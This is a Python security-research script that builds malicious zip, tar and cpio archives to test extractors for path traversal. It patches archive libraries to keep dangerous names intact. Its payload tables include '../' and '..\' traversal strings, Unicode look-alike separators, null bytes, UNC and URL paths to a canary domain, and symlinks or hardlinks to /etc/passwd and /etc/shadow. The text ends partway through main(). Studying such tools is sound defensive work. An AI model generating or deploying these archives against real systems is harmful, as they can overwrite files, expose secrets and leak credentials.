#!/bin/env python3

# A very old vulnerability class where a lot of things have been written about. Just to mention some of the most similar/best known ones:
# https://github.com/jwilk/traversal-archives
# https://github.com/snyk/zip-slip-vulnerability
# https://github.com/0xless/slip

# This is not per se new, but different and with more complex examples, hardlinks, modifiable by people who like Python, etc.

import pathlib
import random
import shutil
import string
import sys
# We can't use tarfile because it left-strips slashes (/) from arcname:
# https://github.com/python/cpython/blob/da2273fec7b1644786b9616592b53b04fdec4024/Lib/tarfile.py#L1851
# made a copy of tarfile.py to farfile.py and uncommented that line, also removed path normalisation
# Additionally, for .tar.gz a new constructor argument was added and gzip.py copied from CPython to fzip.py: gz_tar_name
# It can be used if we want to circumvent the following logic.
# Usually .tar.gz put their own name without the .gz part at the beginning of the file content. The new logic in farfile.py is:
# if self.gz_tar_name:
#     fname = self.gz_tar_name # feature we added to do attacks
# else: # How it was handled in the library originally
#     # RFC 1952 requires the FNAME field to be Latin-1. Do not
#     # include filenames that cannot be represented that way.
#     fname = os.path.basename(self.name)
#     if not isinstance(fname, bytes):
#         fname = fname.encode('latin-1')
#     if fname.endswith(b'.gz'):
#         fname = fname[:-3]
import farfile
# Same reason we can't use zipfile:
# https://github.com/python/cpython/blob/da2273fec7b1644786b9616592b53b04fdec4024/Lib/zipfile/__init__.py#L561
import fipfile
import os
import stat
import subprocess


if os.name == 'nt':
    print("Attention! This script is not safe to use on Windows, because the CPIO part of ")
    print("this script creates files like 'C:\\foo' or '..\\..\\..\\foo' which Linux/MacOS ")
    print("will happily create in the current working directory whereas this would not work ")
    print("as intended on Windows!")
    exit(1)


ZWJ = b"\xE2\x80\x8D".decode() #zero width joiner (invisible symbol) representation in UTF-8

###
# Options:
###
INPUT_FOLDER = "folder-to-pack"
OUTPUT_DIR = "outputs"
FILE_CONTENT = "Just a test"
PAYLOAD_DEFAULT_NAME = "XXX"
PAYLOAD_DEFAULT_LINKNAME = "ZZZ"
OUTPUT_FILE_PREFIX = ""


CANARY_DOMAIN = "4in55p01plqupjgqeja8syv34ualycm1.pgd.li"  # Some payloads try a back-connect (e.g. UNC paths), monitor this domain!

# You can either use ../../../TRVS (value of PAYLOAD_DEFAULT_NAME) when this is True.
# When set to False it will try to use the same name as the archive's name, because this way you can simply try to unpack all files
# and e.g. if you find a file called "unix_traversal_3_deflated-lvl0_zip" somewhere it does not belong (path traversal)
# you immediately know from which archive file this file was coming.
# HOWEVER, as those filenames are often too long for ustar tar files, it will fall back to the value of PAYLOAD_DEFAULT_NAME
# for many ustar tar files
USE_PAYLOAD_DEFAULT_NAME = False

PATH_TRAVERSAL_ATTACKS = (
    # name, payload, start, depths
    ("win", "..\\", "", (1, 10)),
    ("win_zwj", f".{ZWJ}.\\", "", (1, 10)),
    ("win_root", "..\\", "/", (1, 10)),
    ("win_5root", "", "\\\\\\\\\\", (0, )),
    ("win_c_colon", "", "C:../", (0, )), # see https://github.com/isaacs/node-tar/security/advisories/GHSA-5955-9wpr-37jh
    ("win_c_colon_bs", "", "C:..\\", (0, )), # see https://github.com/isaacs/node-tar/security/advisories/GHSA-5955-9wpr-37jh
    ("win_c_colon_s", "\\", "C:", (0, 1, 10)), 
    ("win_c_colon_dir", "M\\N\\O", "C:", (1, )),  # see https://github.com/isaacs/node-tar/security/advisories/GHSA-5955-9wpr-37jh
    #("win_c_colon_bs", "..\\", "C:\\", (0, 3, 10)), 
    ("win_c_2colon", "..\\", "C::", (0, 10)), 
    ("win_c_2colon_bs", "..\\", "C::\\", (0, 3, 10)),
    ("win_c_ext_len", "", "\\\\?\\C:\\", (0, )), # extended-length path, see https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry
    ("win_c_unc", "", f"\\\\{CANARY_DOMAIN}\\", (0, )), # UNC path that could do SMB
    ("win_c_ext_unc", "", f"\\\\?\\UNC\\{CANARY_DOMAIN}\\", (0, )), # extended-length path with UNC official, see https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry
    ("win_c_ext_unc2", "", f"\\\\?\\\\\\{CANARY_DOMAIN}\\", (0, )), # extended-length path with UNC might not work, but worth a shot, see https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry
    ("http", "", f"http://{CANARY_DOMAIN}/", (0, )), 
    ("https", "", f"https://{CANARY_DOMAIN}/", (0, )),
    ("mailto", "", f"mailto:foo@{CANARY_DOMAIN}?", (0, )),
    ("unx", "../", "", (0, 1, 3, 10)),
    ("unx_zwj", f".{ZWJ}./", "", (1, 10)),
    ("unx_file", "", f"file:///", (0, )), # file URL
    ("unx_cwd", "../", "./A/", (0, 3, 10)),
    ("unx_root", "../", "/", (0, 1, 10)),
    #("unx_2root", "../", "//", (0, 1, 3, 10)),
    ("unx_5root", "../", "/////", (0, 1, 10)), # see https://github.com/isaacs/node-tar/security/advisories/GHSA-3jfq-g458-7qm9
    ("unx_null", "", "\x00", (0, )),
    ("unx_nullr", "", "\x00////", (0, )),
    ("unx_ucode", "..∕", "", (1, 3, 10)),
    ("unx_ucode2", "。。/", "", (1, 3, 10)),
)

LINK_ATTACKS = (
    ("link_empty", ""),
    ("link_zerobyte", "/\x00/"),
    ("link_c_drive", "C:\\"),
    ("link_slash", "/"),
    ("link_triple_slash", "///"),
    ("link_dotdot", ".."),
    ("link_dotdot_slash", "../"),
    ("link_dotdot_backslash", "..\\"),
    ("link_path_traversal", "../../../../../../../../../"),
    ("link_path_traversal_unicode_slash", "..∕..∕..∕..∕..∕..∕..∕..∕..∕"),  # Attention: Unicode characters that might clash with / when normalized!  ̸ ⁄ ∕ ╱ ⫻ ⫽ ／ ﾉ
    ("link_path_traversal_unicode_dots", "。。/。。/。。/。。/。。/。。/。。/"),  # Attention: Unicode characters that might clash with / when normalized! ․ ‧ 。 ． ｡٠.
    ("link_passwd", "/etc/passwd"),
    ("link_shadow", "/etc/shadow"),
    ("link_notepad", "C:\\windows\\notepad.exe"),
    ("link_A_attack", "A"),
    ("link_B_attack", "B"),
    ("link_A_path_traversal", "A/../../../../../../../../"),
    ("link_A_C_path_traversal", "A/C/../../../../../../../../")
)

# Does the compression influence the unpacking location? Usually not, because it's only the file content that is compressed, not the file name. By default only use deflated.
ZIP_CONFIG = (
    # compression, compression levels to use (None = not applicable)
    (fipfile.ZIP_STORED, (None, )),
    (fipfile.ZIP_DEFLATED, (
    0, 
    9,
    )),
    (fipfile.ZIP_BZIP2, (
    1,
    9,
    )),
    (fipfile.ZIP_LZMA, (None, )),
)

# Does the encoding influence the unpacking location? It might...
TAR_ENCODING_CONFIG = (
   'ascii',
    'utf-8',
    'utf-16',
    'utf-32',
    'utf-16-be',
    'utf-16-le',
    'utf-32-be',
    'utf-32-le',
)

TAR_COMPRESSION_CONFIG = (
    (".tar", ""),
    (".tar.gz", "gz"),
     (".tar.bz2", "bz2"),
)

# Does the tar file name escaping influence the unpacking location? It probably does in certain cases.
TAR_ERRORS_CONFIG = (
    # error handler
    'ignore',
    'backslashreplace',
    'surrogateescape',
    'xmlcharrefreplace',
    'namereplace',
    'surrogatepass',
)

# Does the tar type influence the unpacking location? It might if there are special code or special cases...
TAR_CONFIG = (
    # format name, format, encodings
    # Please be aware that the utf-32 encodings will mostly not work for ustar because it has a 100 char file name limit
    (farfile.USTAR_FORMAT, TAR_ENCODING_CONFIG),
    (farfile.GNU_FORMAT, TAR_ENCODING_CONFIG),
    (farfile.PAX_FORMAT, TAR_ENCODING_CONFIG),
)

CPIO_CONFIG = (
    # format name, ASCII on/off
    'ascii',
    'bin',
    'odc',
    'newc',
    'crc',
    'tar',
    'ustar',
    'hpbin',
    'hpodc',
)


###
# END Options
###

def add_cwd_to_archive(archive_function):
    for root, dirs, files in os.walk('.'):
        for d in dirs:
            path = root[2:]
            if path:
                path += os.path.sep
            path_to_dir = path + d
            archive_function(path_to_dir)
        for f in files:
            path = root[2:]
            if path:
                path += os.path.sep
            path_to_file = path + f
            archive_function(path_to_file)

class UnsupportedException(Exception):
    pass


class FileAlreadyExistsException(Exception):
    pass

class CustomArchive:

    def __init__(self, attack_name):
        self.attack_name = attack_name

    def init_logfile(self):
        self.info_out_file = open(self.get_output_path(no_extension=True) + ".txt", "w")
        self.info_out_file.write(f"Attack name: {self.attack_name}\n")

    def add_dummy_file_at_path(self, payload_path):
        dummy = "../tmp_file"
        return self.add_dummy_at_path(dummy, payload_path, is_file=True)

    def add_dummy_dir_at_path(self, payload_path):
        dummy = "../tmp_dir"
        return self.add_dummy_at_path(dummy, payload_path, is_file=False)

    def add_dummy_symlink_to_path(self, to_name):
        from_name = "S" + PAYLOAD_DEFAULT_LINKNAME
        if USE_PAYLOAD_DEFAULT_NAME:
            self.add_symlink(from_name, to_name)
        else:
            try:
                from_name = self.get_output_filename_addition()
                self.add_symlink(from_name, to_name)
            except UnsupportedException as e:
                from_name = PAYLOAD_DEFAULT_LINKNAME
                self.add_symlink(from_name, to_name)
        return from_name

    def add_dummy_hardlink_to_path(self, to_name):
        from_name = "H" + PAYLOAD_DEFAULT_LINKNAME
        if USE_PAYLOAD_DEFAULT_NAME:
            self.add_hardlink(PAYLOAD_DEFAULT_LINKNAME, to_name)
        else:
            try:
                from_name = self.get_output_filename_addition()
                self.add_hardlink(from_name, to_name)
            except UnsupportedException as e:
                from_name = PAYLOAD_DEFAULT_LINKNAME
                self.add_hardlink(from_name, to_name)
        return from_name

    def close_and_remove(self):
        try:
            self.close()
        except Exception:
            pass
        file_path = self.get_output_path()
        if os.path.exists(file_path):
            os.remove(file_path)
        file_path = self.get_output_path(no_extension=True) + ".txt"
        if os.path.exists(file_path):
            os.remove(file_path)

class CustomZipArchive(CustomArchive):

    NAMES_COMPRESSION = {
        0: "stored",
        8: "deflated",
        12: "bzip2",
        14: "lzma"
    }
    def __init__(self, attack_name, compression, compress_level):
        super().__init__(attack_name)
        self.file_type = "zip"
        self.compression = compression # fiplib.ZIP_STORED, fiplib.ZIP_DEFLATED, fiplib.ZIP_BZIP2, fiplib.ZIP_LZMA
        self.compress_level = compress_level # 0 to 9

        self.compression_name = CustomZipArchive.NAMES_COMPRESSION[self.compression]
        if os.path.isfile(self.get_output_path()):
            raise FileAlreadyExistsException(f"File already exists: {self.get_output_path()}")
        self.archive_out_file = fipfile.ZipFile(self.get_output_path(), "w", compression=self.compression, compresslevel=self.compress_level)
        self.init_logfile()
        self.info_out_file.write(f"Compression name: {self.compression_name}\n"
                                 f"Compression level: {self.compress_level}\n")

    def get_output_filename_addition(self):
        addition = self.attack_name + "_" + self.compression_name
        if not self.compress_level is None:
            addition += f"-lvl{self.compress_level}"
        return addition #+ "_" + str(random.randint(10000, 99999))

    def get_output_path(self, no_extension=False):
        path = f"../{OUTPUT_DIR}/{self.file_type}/{self.compression_name}/{OUTPUT_FILE_PREFIX}" + self.get_output_filename_addition()
        if no_extension:
            return path
        else:
            return path + "." + self.file_type

    def add_cwd_content(self):
        add_cwd_to_archive(self.archive_out_file.write)
        self.info_out_file.write(f"- All files from {INPUT_FOLDER} were packed into this archive\n")

    def add_dummy_at_path(self, dummy, payload_path, is_file=True):
        #payload_path = payload_path if payload_path.endswith("/") else payload_path + "/"
        dir_or_file = "file" if is_file else "dir"
        if USE_PAYLOAD_DEFAULT_NAME:
            self.archive_out_file.write(dummy, arcname=payload_path + PAYLOAD_DEFAULT_NAME)
            self.info_out_file.write(f"- Added {dir_or_file} at {payload_path + PAYLOAD_DEFAULT_NAME}\n")
        else:
            try:
                filename_in_archive = payload_path + self.get_output_filename_addition() + "_" + self.file_type
                self.archive_out_file.write(dummy, arcname=filename_in_archive)
                self.info_out_file.write(f"- Added {dir_or_file} at {filename_in_archive}\n")
            except ValueError as e:
                #Logger.info(f"Got ValueError '{e}' when adding {name} for {output_path_with_compression}, using {fake_path} instead")
                self.archive_out_file.write(dummy, arcname=payload_path + PAYLOAD_DEFAULT_NAME)
                self.info_out_file.write(f"- Added {dir_or_file} at {payload_path + PAYLOAD_DEFAULT_NAME}\n")

    def add_file(self, file_path, content):
        try:
            os.remove("../tmp_file2")
        except FileNotFoundError:
            pass
        with open("../tmp_file2", "w") as f:
            f.write(content)
        self.archive_out_file.write("../tmp_file2", arcname=file_path)
        self.info_out_file.write(f"- Added file at {file_path} with content {content[:10]}...\n")

    def add_dir(self, dir_path):
        self.archive_out_file.write("../tmp_dir", arcname=dir_path)
        self.info_out_file.write(f"- Added dir at {dir_path}\n")

    def add_symlink(self, from_name, to_name):
        zipInfo = fipfile.ZipInfo(from_name)
        zipInfo.create_system = 3 # System which created ZIP archive, 3 = Unix; 0 = Windows
        unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
        zipInfo.external_attr = unix_st_mode << 16 # The Python zipfile module accepts the 16-bit "Mode" field (that stores st_mode field from struct stat, containing user/group/other permissions, setuid/setgid and symlink info, etc) of the ASi extra block for Unix as bits 16-31 of the external_attr
        self.archive_out_file.writestr(zipInfo, to_name)
        self.info_out_file.write(f"- Added symlink pointing from {from_name} to {to_name}\n")

    def add_hardlink(self, from_name, to_name):
        # TODO
        raise UnsupportedException("Hardlinks not supported for zip files")

    def close(self):
        self.archive_out_file.close()
        self.info_out_file.close()


class CustomTarArchive(CustomArchive):

    NAMES_ERROR = {
        'ignore': "ign",
        'backslashreplace': "bsrep",
        'surrogateescape': "suresc",
        "xmlcharrefreplace": "xml",
        "namereplace" : "nrep",
        "surrogatepass" : "surpas"
    }

    NAMES_FORMAT = {
        0: "ustar",
        1: "gnu",
        2: "pax"
    }

    def __init__(self, attack_name, file_ext, compression, tar_format, encoding, error, gz_tar_name=None):
        super().__init__(attack_name)
        self.file_ext = file_ext # .tar or .tar.gz or .tar.bz2
        self.compression = compression # empty string, gz or bz2
        self.tar_format = tar_format # farfile.USTAR_FORMAT, farfile.GNU_FORMAT or farfile.PAX_FORMAT
        self.encoding = encoding # ascii, utf-8, utf-16, utf-32, utf-16-be, utf-16-le, utf-32-be or utf-32-le
        self.error = error # ignore, backslashreplace, surrogateescape, xmlcharrefreplace, namereplace or surrogatepass
        self.gz_tar_name = gz_tar_name.encode("iso-8859-1", "replace") if gz_tar_name else gz_tar_name

        self.format_name = CustomTarArchive.NAMES_FORMAT[self.tar_format]
        self.encoding_name = self.encoding.replace("-", "").replace("utf", "u")
        self.error_name = CustomTarArchive.NAMES_ERROR[error]
        if self.compression:
            compression = f"w:{compression}"
        else:
            compression = "w"
        if os.path.isfile(self.get_output_path()):
            raise FileAlreadyExistsException(f"File already exists: {self.get_output_path()}")
        if file_ext == ".tar.gz":
            self.archive_out_file = farfile.open(self.get_output_path(), compression, format=self.tar_format, encoding=encoding, errors=error, gz_tar_name=self.gz_tar_name)
        else:
            self.archive_out_file = farfile.open(self.get_output_path(), compression, format=self.tar_format, encoding=encoding, errors=error)
        self.init_logfile()
        self.info_out_file.write(f"Compression name: {self.compression}\n"
                                 f"Tar format: {self.format_name}\n"
                                 f"Encoding: {self.encoding}\n"
                                 f"Error function: {self.error}\n")
        if self.gz_tar_name:
            n = self.gz_tar_name.decode("iso-8859-1")
            self.info_out_file.write(f"- .gz.tar name of included .tar: {n}\n")

    def get_output_filename_addition(self, short=True):
        # The "short" variable only matters if USE_PAYLOAD_DEFAULT_NAME is False,
        # although it would be nice to know from which encoding/error scheme the file
        # has its origins, putting the encoding/error scheme as a filename into the tar means
        # that the resulting tar files will differ for sure. However, with our file duplication deletion strategy
        # that's a problem.
        # Example: backslashreplace and surrogateescape error schemes create exactly the same
        # filenames as long as only ascii is used. So we want to delete the files they create with the duplicate check.
        # However, if we write the filename with "_bsrep_" or "_suresc_" into the tar, they are not duplicates anymore.
        # If you switch the "short" option to False, a lot more files will be created that are from an attack point of
        # view identical.
        # On the other hand we need the long version for output file names, otherwise we have two times the same
        # and that's bad because we would overwrite another test case
        if short:
            addition = "_".join((self.attack_name, self.format_name))
        else:
            addition = "_".join((self.attack_name, self.format_name, self.encoding_name, self.error_name))
        return addition #+ "_" + str(random.randint(10000, 99999))

    def get_output_path(self, no_extension=False):
        path = f"../{OUTPUT_DIR}/{self.file_ext[1:]}/{self.format_name}/{OUTPUT_FILE_PREFIX}" + self.get_output_filename_addition(short=False)
        if no_extension:
            return path
        else:
            return path + self.file_ext

    def add_cwd_content(self):
        try:
            add_cwd_to_archive(self.archive_out_file.add)
        except ValueError as e:
            raise UnsupportedException(e)
        self.info_out_file.write(f"- All files from {INPUT_FOLDER} were packed into this archive\n")

    def add_dummy_at_path(self, dummy, payload_path, is_file=True):
        #payload_path = payload_path if payload_path.endswith("/") else payload_path + "/"
        dir_or_file = "file" if is_file else "dir"
        if not USE_PAYLOAD_DEFAULT_NAME:
            try:
                filename_in_archive = payload_path + self.get_output_filename_addition() + "_" + self.file_ext.replace(".", "")
                self.archive_out_file.add(dummy, arcname=filename_in_archive)
                self.info_out_file.write(f"- Added {dir_or_file} at {filename_in_archive}\n")
                return
            except ValueError as e:
                pass
        try:
            self.archive_out_file.add(dummy, arcname=payload_path + PAYLOAD_DEFAULT_NAME)
            self.info_out_file.write(f"- Added {dir_or_file} at {payload_path + PAYLOAD_DEFAULT_NAME}\n")
        except ValueError as e:
            raise UnsupportedException(f"{self.__class__.__name__} {self.file_ext} {self.format_name} "
                                       f"{self.attack_name} {self.encoding_name} {self.error_name} {self.gz_tar_name} "
                                       f"{payload_path} - ValueError: {e}")

    def add_file(self, file_path, content):
        try:
            os.remove("../tmp_file2")
        except FileNotFoundError:
            pass
        with open("../tmp_file2", "w") as f:
            f.write(content)
        try:
            self.archive_out_file.add("../tmp_file2", arcname=file_path)
            self.info_out_file.write(f"- Added file at {file_path} with content {content[:10]}...\n")
        except ValueError as e:
            raise UnsupportedException(f"{self.__class__.__name__} {self.file_ext} {self.format_name} "
                                       f"{self.attack_name} {self.encoding_name} {self.error_name} {self.gz_tar_name} "
                                       f"{file_path} - ValueError: {e}")

    def add_dir(self, dir_path):
        try:
            self.archive_out_file.add("../tmp_dir", arcname=dir_path)
            self.info_out_file.write(f"- Added dir at {dir_path}\n")
        except ValueError as e:
            raise UnsupportedException(f"{self.__class__.__name__} {self.file_ext} {self.format_name} "
                                       f"{self.attack_name} {self.encoding_name} {self.error_name} {self.gz_tar_name} "
                                       f"{dir_path} - ValueError: {e}")

    def add_symlink(self, from_name, to_name):
        # Create a symlink
        tar_info = farfile.TarInfo(from_name)
        # SYMTYPE:
        # This represents a symbolic link to another file. The linked-to name is specified in the linkname field
        # with a trailing null.
        tar_info.type = farfile.SYMTYPE
        tar_info.linkname = to_name
        tar_info.mtime = 0 # epoch
        tar_info.mode = 0o777
        tar_info.uid = 0
        tar_info.gid = 0
        tar_info.uname = "root"
        tar_info.gname = "root"
        try:
            self.archive_out_file.addfile(tar_info)
            self.info_out_file.write(f"- Added symlink pointing from {from_name} to {to_name}\n")
        except ValueError as e:
            raise UnsupportedException(f"{self.__class__.__name__} {self.file_ext} {self.format_name} "
                                       f"{self.attack_name} {self.encoding_name} {self.error_name} {self.gz_tar_name} "
                                       f"{from_name} {to_name} - ValueError: {e}")

    def add_hardlink(self, from_name, to_name):
        # Create a hardlink
        tar_info = farfile.TarInfo(from_name)
        # LNKTYPE:
        # This flag represents a file linked to another file, of any type, previously archived. Such files are
        # identified in Unix by each file having the same device and inode number. The linked-to name is specified
        # in the link name field with a trailing null.
        tar_info.type = farfile.LNKTYPE
        tar_info.linkname = to_name
        tar_info.mtime = 0
        tar_info.mode = 0o777
        tar_info.uid = 0
        tar_info.gid = 0
        tar_info.uname = "root"
        tar_info.gname = "root"
        try:
            self.archive_out_file.addfile(tar_info)
            self.info_out_file.write(f"- Added hardlink pointing from {from_name} to {to_name}\n")
        except ValueError as e:
            raise UnsupportedException(f"{self.__class__.__name__} {self.file_ext} {self.format_name} "
                                       f"{self.attack_name} {self.encoding_name} {self.error_name} {self.gz_tar_name} "
                                       f"{from_name} {to_name} - ValueError: {e}")
    def close(self):
        self.archive_out_file.close()
        self.info_out_file.close()

class CustomCpioArchive(CustomArchive):
        
    # Formats according to GNU CPIO https://www.gnu.org/software/cpio/manual/html_node/Options.html
    #'bin' The obsolete binary format. (2147483647 bytes)
    #'odc' The old (POSIX.1) portable format. (8589934591 bytes)
    #'newc' The new (SVR4) portable format, which supports file systems having more than 65536 i-nodes. (4294967295 bytes)
    #'crc' The new (SVR4) portable format with a checksum added.
    #'tar' The old tar format. (8589934591 bytes)
    #'ustar' The POSIX.1 tar format. Also recognizes GNU tar archives, which are similar but not identical. (8589934591 bytes)
    #'hpbin' The obsolete binary format used by HPUX's cpio (which stores device files differently).
    #'hpodc' The portable format used by HPUX's cpio (which stores device files differently).
    # Apparently for them, ASCII is an option:
    #-c                         Use the old portable (ASCII) archive format

    # Libarchive produces 'ASCII cpio archive (SVR4 with no CRC)'
    # BSD cpio is based on libarchive:
    # % cpio --help
    # cpio(bsdcpio): manipulate archive files
    # First option must be a mode specifier:
    #   -i Input  -o Output  -p Pass
    # Common Options:
    #   -v Verbose filenames     -V  one dot per file
    # Create: cpio -o [options]  < [list of files] > [archive]
    #   -J,-y,-z,--lzma  Compress archive with xz/bzip2/gzip/lzma
    #   --format {odc|newc|ustar}  Select archive format
    # List: cpio -it < [archive]
    # Extract: cpio -i [options] < [archive]
    # bsdcpio 3.5.1 - libarchive 3.5.1 zlib/1.2.11 liblzma/5.0.5 bz2lib/1.0.8

    # GNU cpio supports many more formats:
    # % ./cpio-2.14/cpio --version
    # cpio (GNU cpio) 2.14
    # Copyright (C) 2023 Free Software Foundation, Inc.
    # License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
    # This is free software: you are free to change and redistribute it.
    # There is NO WARRANTY, to the extent permitted by law.
    #
    # Written by Phil Nelson, David MacKenzie, John Oleynick,
    # and Sergey Poznyakoff.

    # None of the python bindings of CPIO is really sufficient

    FILETYPE = "cpio"

    ABSOLUT_FILENAMES = '--absolute-filenames'
    CREATE_ARG = ["--create"]
    APPEND_ARG = ["--create", "--append"]

    FORMAT_ARG = "--format="
    OUTPUT_ARG = '-O'
    ASCII_ARG = "-c"

    def __init__(self, gnu_cpio_binary, attack_name, format):
        super().__init__(attack_name)
        self.gnu_cpio_binary = gnu_cpio_binary
        self.format = format
        if os.path.isfile(self.get_output_path()):
            raise FileAlreadyExistsException(f"File already exists: {self.get_output_path()}")

        #self.archive_out_file = libarchive.Archive(self.get_output_path(), 'w')
        self.output_path = self.get_output_path()
        self.was_created = False
        self.replacements = []
        self.init_logfile()

    def _get_command(self):
        cmd = [self.gnu_cpio_binary, ]
        cmd.extend(self._arg_create_or_append())
        if self.format == "ascii":
            cmd.append(CustomCpioArchive.ASCII_ARG)
        else:
            cmd.append(CustomCpioArchive.FORMAT_ARG + self.format)
        cmd.extend([CustomCpioArchive.ABSOLUT_FILENAMES,
                CustomCpioArchive.OUTPUT_ARG, self.output_path])
        #print(cmd)
        return cmd

    def _arg_create_or_append(self):
        if self.was_created:
            return CustomCpioArchive.APPEND_ARG
        else:
            self.was_created = True
            return CustomCpioArchive.CREATE_ARG

    def _add_nonexisting_circumvent_filtering(self, name, type, content=FILE_CONTENT, to_name=None):
        # type:
        # 0 = file
        # 1 = directory
        # 2 = symlink
        name_to_use = name
        repeat = 0
        success = False
        errors = ""
        while repeat < 5:
            # Is this file safe to create and is it then stored in the cwd?
            if not "/" in name and name != "." and name != "..":
                repeat = 99 # we do not need to replace or repeat, this is safe *ON UNIX LIKE SYSTEMS*
                success = True
                # print(f"Success: {name_to_use} is safe for CPIO {self.format} file {self.output_path}")
            else:
                repeat += 1
                name_to_use = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.ascii_letters, k=len(name)))
                shutil.copyfile(self.output_path, "/tmp/cpio-file-tmp.cpio")
            if type == 0:
                try:
                    with open(name_to_use, "w") as f:
                        f.write(content)
                except OSError as e:
                    raise UnsupportedException(e)
            elif type == 1:
                try:
                    os.mkdir(name_to_use)
                except OSError as e:
                    raise UnsupportedException(e)
            elif type == 2:
                if "\x00" in to_name:
                    raise UnsupportedException("Embedded null bytes not supported in CPIO symlink target")
                try:
                    os.symlink(to_name, name_to_use)
                except OSError as e:
                    raise UnsupportedException(e)
            self._add_list_of_existing_components((name_to_use,))
            if type == 0:
                os.remove(name_to_use)
            elif type == 1:
                os.removedirs(name_to_use)
            elif type == 2:
                os.remove(name_to_use)
            if name != name_to_use:
                with open(self.get_output_path(), "rb") as f:
                    cpio_content = f.read()
                with open(self.get_output_path(), "wb") as f:
                    count = cpio_content.count(name_to_use.encode())
                    if count == 0:
                        #print(f"ERROR: Couldn't find the file {name_to_use} we just put into the CPIO {self.format} file {self.output_path}")
                        shutil.copyfile("/tmp/cpio-file-tmp.cpio", self.output_path)
                        errors += "{name_to_use} not in file. "
                    elif count == 1:
                        cpio_content = cpio_content.replace(name_to_use.encode(), name.encode())
                        f.write(cpio_content)
                        repeat = 99 # we do not need to replace or repeat, as it worked as expected
                        #print(f"Success: {name_to_use} we just put into the CPIO {self.format} file {self.output_path} was renamed to {name}")
                        success = True
                    else:
                        #print(f"ERROR: There is more than once the string {name_to_use} in the CPIO {self.format} file {self.output_path}")
                        shutil.copyfile("/tmp/cpio-file-tmp.cpio", self.output_path)
                        errors += "More than one {name_to_use} in file. "
        if not success:
            raise UnsupportedException(f"Tried 5 times to include name {name_to_use} as a replacement for {name} in the CPIO {self.format} file {self.output_path} but that didn't work. Errors were: {errors}")


    def _add_list_of_existing_components(self, file_list):
        stdin_input = "\n".join(file_list).encode()
        cmd = self._get_command()
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout = p.communicate(input=stdin_input)[0]
        #print(stdout.decode())
    def get_output_filename_addition(self):
        addition = f"{self.attack_name}_{self.format}"
        return addition #+ "_" + str(random.randint(10000, 99999))
    def get_output_path(self, no_extension=False):
        path = f"../{OUTPUT_DIR}/{CustomCpioArchive.FILETYPE}/{self.format}/{OUTPUT_FILE_PREFIX}" + self.get_output_filename_addition()
        if no_extension:
            return path
        else:
            return path + "." + CustomCpioArchive.FILETYPE

    def add_cwd_content(self):
        file_list = []
        add_cwd_to_archive(file_list.append)
        self._add_list_of_existing_components(file_list)
        self.info_out_file.write(f"- All files from {INPUT_FOLDER} were packed into this archive\n")

    def add_dummy_at_path(self, _, payload_path, is_file=True):
        #payload_path = payload_path if payload_path.endswith("/") else payload_path + "/"
        dir_or_file = "file" if is_file else "dir"
        if "\x00" in payload_path:
            raise UnsupportedException("Zero bytes in payloads are not supported by the CPIO toolchain")
        else:
            if USE_PAYLOAD_DEFAULT_NAME:
                self._add_nonexisting_circumvent_filtering(payload_path + PAYLOAD_DEFAULT_NAME, 0 if is_file else 1)
                self.info_out_file.write(f"- Added {dir_or_file} at {payload_path + PAYLOAD_DEFAULT_NAME}\n")
            else:
                filename_in_archive = payload_path + self.get_output_filename_addition() + "_" + CustomCpioArchive.FILETYPE
                self._add_nonexisting_circumvent_filtering(filename_in_archive, 0 if is_file else 1)
                self.info_out_file.write(f"- Added {dir_or_file} at {filename_in_archive}\n")

    def add_file(self, file_path, content):
        try:
            os.remove("../tmp_file2")
        except FileNotFoundError:
            pass
        with open("../tmp_file2", "w") as f:
            f.write(content)
        self._add_nonexisting_circumvent_filtering(file_path, 0, content=content)
        self.info_out_file.write(f"- Added file at {file_path} with content {content[:10]}...\n")

    def add_dir(self, dir_path):
        self._add_nonexisting_circumvent_filtering(dir_path, 1)
        self.info_out_file.write(f"- Added dir at {dir_path}\n")

    def add_symlink(self, from_name, to_name):
        self._add_nonexisting_circumvent_filtering(from_name, 2, to_name=to_name)
        self.info_out_file.write(f"- Added symlink pointing from {from_name} to {to_name}\n")

    def add_hardlink(self, from_name, to_name):
        # TODO
        raise UnsupportedException("Hardlinks not supported for cpio files")

    def close(self):
        self.info_out_file.close()


class ZipVariationCreator:
    def create(self, attack_name):
        for compression, compress_levels in ZIP_CONFIG:
            for compress_level in compress_levels:
                try:
                    yield CustomZipArchive(attack_name, compression, compress_level)
                except FileAlreadyExistsException:
                    Logger.info(f"File already exists, not creating ZIP {attack_name}, {compression}, {compress_level}")

class TarVariationCreator:
    def create(self, attack_name):
        for compression_file_ext, compression in TAR_COMPRESSION_CONFIG:
            for format, encodings in TAR_CONFIG:
                for encoding in encodings:
                    for error in TAR_ERRORS_CONFIG:
                        try:
                            yield CustomTarArchive(attack_name, compression_file_ext, compression, format, encoding, error)
                        except FileAlreadyExistsException:
                            Logger.info(f"File already exists, not creating TAR {attack_name}, {compression_file_ext}, {compression}, {format}, {encoding}, {error}")
class CpioVariationCreator:
    def __init__(self, gnu_cpio_binary):
        self.gnu_cpio_binary = gnu_cpio_binary

    def create(self, attack_name):
        for format in CPIO_CONFIG:
            try:
                yield CustomCpioArchive(self.gnu_cpio_binary, attack_name, format)
            except FileAlreadyExistsException:
                Logger.info(f"File already exists, not creating CPIO {attack_name}, {format}")


def main():

    with open("tmp_file", "w") as f:
        f.write(FILE_CONTENT)

    if not os.path.exists("tmp_dir"):
        os.mkdir("tmp_dir")

    if not os.path.exists(OUTPUT_DIR):
        os.mkdir(OUTPUT_DIR)
    if not os.path.exists(f"{OUTPUT_DIR}/zip"):
        os.mkdir(f"{OUTPUT_DIR}/zip")
        for name in CustomZipArchive.NAMES_COMPRESSION.values():
            os.mkdir(f"{OUTPUT_DIR}/zip/{name}")
    if not os.path.exists(f"{OUTPUT_DIR}/tar"):
        os.mkdir(f"{OUTPUT_DIR}/tar")
        os.mkdir(f"{OUTPUT_DIR}/tar/ustar")
